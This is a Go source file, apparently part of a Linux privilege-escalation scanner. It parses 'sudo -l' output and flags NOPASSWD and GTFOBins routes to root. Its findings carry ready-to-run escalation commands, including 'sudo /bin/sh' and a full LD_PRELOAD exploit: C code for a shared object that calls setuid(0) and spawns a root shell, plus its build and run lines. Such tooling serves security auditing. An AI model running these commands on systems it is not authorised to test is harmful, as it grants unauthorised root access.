package scan

import (
	"strings"
)

// SudoCheck reads the current user's sudo privileges with `sudo -n -l`
// (non-interactive, listing only — it never runs a sudo command) and reports
// NOPASSWD entries that lead to root, correlating binaries against GTFOBins.
type SudoCheck struct{}

func (SudoCheck) Name() string { return "sudo" }

func (s *SudoCheck) Detect(c *Context) []Finding {
	// -n: never prompt; -l: list privileges. Read-only.
	out, err := c.run("sudo", "-n", "-l")
	if err != nil && strings.TrimSpace(out) == "" {
		// sudo absent, or a password is required and nothing is listable.
		return nil
	}
	return parseSudoListing(out)
}

// parseSudoListing turns `sudo -n -l` output into findings. Pure function so it
// can be unit-tested without invoking sudo.
func parseSudoListing(out string) []Finding {
	const checkName = "sudo"
	var findings []Finding
	var allowedBins []string // sudo-runnable binaries seen, for the env_keep route
	for _, raw := range strings.Split(out, "\n") {
		line := strings.TrimSpace(raw)
		if line == "" || !strings.Contains(line, ")") {
			continue
		}
		// We only care about privilege lines: "(runas) [TAG:] command".
		// Find the runas clause and what follows it.
		idx := strings.Index(line, ")")
		rest := strings.TrimSpace(line[idx+1:])
		if rest == "" {
			continue
		}

		nopasswd := strings.Contains(rest, "NOPASSWD:")
		rest = strings.TrimPrefix(rest, "NOPASSWD:")
		rest = strings.TrimPrefix(strings.TrimSpace(rest), "PASSWD:")
		cmdSpec := strings.TrimSpace(rest)

		// Full sudo rights -> direct root shell.
		if cmdSpec == "ALL" || cmdSpec == "ALL : ALL" {
			conf := ConfHigh
			cmd := "sudo /bin/sh"
			ev := "sudo -l: " + line
			if !nopasswd {
				conf = ConfMedium // needs your password; still a route if you have it
				cmd = "sudo -i   # (will prompt for your password)"
			}
			findings = append(findings, Finding{
				Check:       checkName,
				Title:       "Unrestricted sudo (ALL) — direct root",
				Category:    "sudo",
				Confidence:  conf,
				BlastRadius: BlastSafe,
				Evidence:    ev,
				Command:     cmd,
				Reference:   "https://gtfobins.github.io/",
			})
			continue
		}

		// Specific binaries: correlate each against GTFOBins.
		for _, tok := range strings.Fields(cmdSpec) {
			if !strings.HasPrefix(tok, "/") {
				continue // skip args, env assignments, tags
			}
			allowedBins = append(allowedBins, tok)
			tech, ok := lookupGTFO(tok)
			if !ok || tech.Sudo == "" {
				continue
			}
			conf := ConfHigh
			note := ""
			if !nopasswd {
				conf = ConfMedium
				note = "  # (sudo will prompt for your password)"
			}
			findings = append(findings, Finding{
				Check:       checkName,
				Title:       "Sudo-runnable " + baseName(tok) + " — GTFOBins shell escape",
				Category:    "sudo",
				Confidence:  conf,
				BlastRadius: BlastSafe,
				Evidence:    "sudo -l: " + line,
				Command:     renderCmd(tech.Sudo, tok) + note,
				Reference:   tech.Ref,
			})
		}
	}

	// sudoers env_keep preserving LD_PRELOAD / LD_LIBRARY_PATH lets a sudo-run
	// program load an attacker .so as root.
	if hasEnvKeepPreload(out) {
		bin := "<a-sudo-allowed-binary>"
		if len(allowedBins) > 0 {
			bin = allowedBins[0]
		}
		findings = append(findings, Finding{
			Check:       checkName,
			Title:       "sudo env_keep preserves LD_PRELOAD — load a root .so",
			Category:    "sudo",
			Confidence:  ConfMedium,
			BlastRadius: BlastReversible,
			Evidence:    "sudo -l shows env_keep with LD_PRELOAD/LD_LIBRARY_PATH",
			Command:     "cat > /tmp/x.c <<'E'\n#include <stdlib.h>\n#include <unistd.h>\nvoid _init(){ setgid(0); setuid(0); execl(\"/bin/sh\",\"sh\",NULL); }\nE\ngcc -fPIC -shared -nostartfiles -o /tmp/x.so /tmp/x.c\nsudo LD_PRELOAD=/tmp/x.so " + bin,
			Reference:   "https://gtfobins.github.io/  (LD_PRELOAD technique); sudoers env_keep misconfig",
		})
	}
	return findings
}

// hasEnvKeepPreload reports whether `sudo -l` output preserves LD_PRELOAD or
// LD_LIBRARY_PATH via env_keep.
func hasEnvKeepPreload(out string) bool {
	for _, line := range strings.Split(out, "\n") {
		if strings.Contains(line, "env_keep") &&
			(strings.Contains(line, "LD_PRELOAD") || strings.Contains(line, "LD_LIBRARY_PATH")) {
			return true
		}
	}
	return false
}
